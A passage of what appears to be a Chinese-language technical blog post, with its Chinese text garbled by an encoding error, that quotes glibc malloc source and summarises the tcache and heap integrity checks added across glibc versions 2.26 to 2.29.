class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes = request2size (bytes);<span class="hljs-comment">//ä¸å®‰å…¨</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>â€¦â€¦<br><br>  MAYBE_INIT_TCACHE ();<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-mallocå‡½æ•°å˜åŒ–"><a href="#int-mallocå‡½æ•°å˜åŒ–" class="headerlink" title="_int_mallocå‡½æ•°å˜åŒ–"></a>_int_mallocå‡½æ•°å˜åŒ–</h3><h4 id="fastbinsçš„æ“ä½œè¿›è¡Œä¹‹å‰"><a href="#fastbinsçš„æ“ä½œè¿›è¡Œä¹‹å‰" class="headerlink" title="fastbinsçš„æ“ä½œè¿›è¡Œä¹‹å‰"></a>fastbinsçš„æ“ä½œè¿›è¡Œä¹‹å‰</h4><p>å¦‚æœchunkçš„å¤§å°ç¬¦åˆè¦æ±‚ï¼Œå¹¶ä¸”å¯¹åº”çš„binsè¿˜æ²¡è£…æ»¡ï¼Œå°±å°†å…¶æ”¾è¿›å»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span><br><span class="hljs-meta">  do\</span><br><span class="hljs-meta">    &#123;\</span><br><span class="hljs-meta">      victim = pp;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta"> != victim);\</span><br><span class="hljs-meta"></span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp = *fb;<br>      REMOVE_FB (fb, victim, pp);<span class="hljs-comment">//è¿”å›victimï¼ˆfastbinæœ€åä¸€ä¸ªchunkï¼‰</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (pp = *fb) != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  REMOVE_FB (fb, tc_victim, pp);<span class="hljs-comment">//ç§»åŠ¨è‡³fastbinæœ€åä¸€ä¸ªchunk</span><br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      tcache_put (tc_victim, tc_idx);<span class="hljs-comment">//æ¯æ¬¡å°†fastbinæœ€åä¸€ä¸ªchunkæ”¾è¿›tcache</span><br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="small-binä¸­åŒä¸Š"><a href="#small-binä¸­åŒä¸Š" class="headerlink" title="small binä¸­åŒä¸Š"></a>small binä¸­åŒä¸Š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              set_inuse_bit_at_offset (victim, nb);<br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (victim);<br>              check_malloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    &#123;<br>      mchunkptr tc_victim;<br><br>      <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>      <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br><br>      tcache_put (tc_victim, tc_idx);<br>            &#125;<br>&#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="for-å¤§å¾ªç¯ä¹‹å‰"><a href="#for-å¤§å¾ªç¯ä¹‹å‰" class="headerlink" title="for(;;)å¤§å¾ªç¯ä¹‹å‰"></a>for(;;)å¤§å¾ªç¯ä¹‹å‰</h4><p>ç›¸å…³å‚é‡è®¡ç®—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>    tcache_nb = nb;<br>  <span class="hljs-type">int</span> return_cached = <span class="hljs-number">0</span>;<br><br>  tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h4 id="unsorted-binä¸­éå†å¯»æ‰¾ç›¸åŒå¤§å°chunkæ—¶"><a href="#unsorted-binä¸­éå†å¯»æ‰¾ç›¸åŒå¤§å°chunkæ—¶" class="headerlink" title="unsorted binä¸­éå†å¯»æ‰¾ç›¸åŒå¤§å°chunkæ—¶"></a>unsorted binä¸­éå†å¯»æ‰¾ç›¸åŒå¤§å°chunkæ—¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (victim);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment"> We may return one of these chunks later.  */</span><br>      <span class="hljs-keyword">if</span> (tcache_nb<br>  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br><span class="hljs-comment">//tcacheæ²¡æ»¡å°±å…ˆå°†ç¬¦åˆçš„chunkæ”¾è¿›tcacheï¼Œæ­¤æ—¶chunkå·²æ‘˜ä¸‹</span><br><span class="hljs-comment">//å¯èƒ½æš‚æ—¶ä¸ä¼šè¿”å›</span><br>&#123;<br>  tcache_put (victim, tc_idx);<br>  return_cached = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125;<br></code></pre></td></tr></table></figure><h4 id="unsorted-binéå†æœ«å°¾"><a href="#unsorted-binéå†æœ«å°¾" class="headerlink" title="unsorted binéå†æœ«å°¾"></a>unsorted binéå†æœ«å°¾</h4><p>tcacheæœ‰å¯è¿”å›çš„chunkåˆ™è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>      ++tcache_unsorted_count;<br>      <span class="hljs-keyword">if</span> (return_cached<br>  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span><br>  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>&#123;<br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;    <br></code></pre></td></tr></table></figure><h4 id="unsorted-binå¾ªç¯ç»“æŸå"><a href="#unsorted-binå¾ªç¯ç»“æŸå" class="headerlink" title="unsorted binå¾ªç¯ç»“æŸå"></a>unsorted binå¾ªç¯ç»“æŸå</h4><p>tcacheæœ‰å¯è¿”å›çš„chunkåˆ™è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>      <span class="hljs-keyword">if</span> (return_cached)<br>&#123;<br>  <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="int-freeå‡½æ•°å˜åŒ–"><a href="#int-freeå‡½æ•°å˜åŒ–" class="headerlink" title="_int_freeå‡½æ•°å˜åŒ–"></a>_int_freeå‡½æ•°å˜åŒ–</h3><p>ä¸¤ä¸ªæ£€æŸ¥ä¹‹åï¼Œå¦‚æœtcacheæœ‰ç¬¦åˆçš„chunkå°±è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>tcache_put (p, tc_idx);<br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="unlinkå¼€å¤´å¢åŠ æ£€æŸ¥"><a href="#unlinkå¼€å¤´å¢åŠ æ£€æŸ¥" class="headerlink" title="unlinkå¼€å¤´å¢åŠ æ£€æŸ¥"></a>unlinkå¼€å¤´å¢åŠ æ£€æŸ¥</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta"><span class="hljs-comment">//sizeå’Œnext chunkçš„presizeçš„æ£€æŸ¥</span></span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \<br>    FD = P-&gt;fd;      \<br>    BK = P-&gt;bk;      \<br><br>â€¦â€¦<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h1><ul><li>checked_request2sizeæ›´æ–°<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;    \</span><br><span class="hljs-meta">  (sz) = request2size (req);    \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (((sz) &lt; (req))    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);    \</span><br><span class="hljs-meta">      return 0;    \</span><br><span class="hljs-meta">    &#125;    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure></li><li>get_max_fastæ›´æ–°<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">get_max_fast (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-comment">/* Tell the GCC optimizers that global_max_fast is never larger</span><br><span class="hljs-comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span><br><span class="hljs-comment">     _int_malloc after constant propagation of the size parameter.</span><br><span class="hljs-comment">     (The code never executes because malloc preserves the</span><br><span class="hljs-comment">     global_max_fast invariant, but the optimizers may not recognize</span><br><span class="hljs-comment">     this.)  */</span><br>  <span class="hljs-keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)<br>    __builtin_unreachable ();<br>  <span class="hljs-keyword">return</span> global_max_fast;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>malloc_stateå¢åŠ have_fastchunks<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<br><br>â€¦â€¦<br><br>&#125;;<br></code></pre></td></tr></table></figure></li><li>__libc_mallocå¼€å¤´ï¼Œrequest2sizeæ›´æ¢ä¸ºæ›´å®‰å…¨çš„checked_request2size<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes;<br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br></code></pre></td></tr></table></figure></li><li>malloc_consolidateçš„æ¯æ¡fastbiné“¾éå†å¼€å¤´æ£€æŸ¥chunkå¤§å°æ˜¯å¦æ­£ç¡®<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index (chunksize (p));<br>  <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<br>    malloc_printerr (<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-28"><a href="#2-28" class="headerlink" title="2.28"></a>2.28</h1><ul><li>_int_mallocä¸­æ•´ç†unsorted binæ‘˜é™¤chunkæ—¶å¢åŠ æ£€æŸ¥chunkçš„è¿æ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-29"><a href="#2-29" class="headerlink" title="2.29"></a>2.29</h1><ul><li>tcache_entryå¢åŠ keyæˆå‘˜æ£€æŸ¥tcacheçš„double free<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure></li><li>tcache_putå’Œtcache_getå…³äºkeyæˆå‘˜çš„å˜åŒ–<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_put (mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<span class="hljs-comment">//æ ‡è®°å·²åœ¨tcacheä¸­</span><br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//æ ‡è®°å·²ä¸åœ¨tcacheä¸­</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>_int_mallocå‡½æ•°ä¸­for(;;)å¤§å¾ªç¯ä¸­unsorted binéå†å¼€å¤´æ£€æŸ¥å¢åŠ 